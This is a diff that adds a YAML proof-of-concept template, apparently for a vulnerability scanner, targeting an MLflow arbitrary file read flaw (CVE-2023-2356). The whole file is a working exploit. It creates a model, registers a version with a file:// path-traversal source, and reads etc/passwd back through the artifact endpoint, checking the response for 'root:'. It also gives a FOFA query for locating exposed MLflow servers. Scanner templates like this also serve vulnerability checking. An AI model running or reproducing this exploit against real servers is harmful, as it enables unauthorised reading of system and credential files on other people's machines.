@@ -1,0 +1,33 @@
+id: poc-yaml-mlflow-anyfile-read
+info:
+  name: mlflow 任意文件读取漏洞(CVE-2023-2356)
+  severity: critical
+  tags:
+  - CVE-2023-2356
+  - 目录遍历
+  finger: mlflow
+  fofa: app="MLflow"
+variables:
+  t1: random_str(5)
+requests:
+- method: POST
+  path: /api/2.0/mlflow/registered-models/create
+  headers:
+    Content-Type: application/json
+  data: '{"name": "{{.t1}}"}
+
+    '
+  expression: status_code == 200 && contains(body,t1)
+- method: POST
+  path: /api/2.0/mlflow/model-versions/create
+  headers:
+    Content-Type: application/json
+  data: '{"name": "{{.t1}}", "source": "file://{{.host}}/../../../../../../../"}
+
+    '
+  expression: status_code == 200
+- method: GET
+  path: /model-versions/get-artifact?path=etc/passwd&name={{.t1}}&version=1
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+transport: http
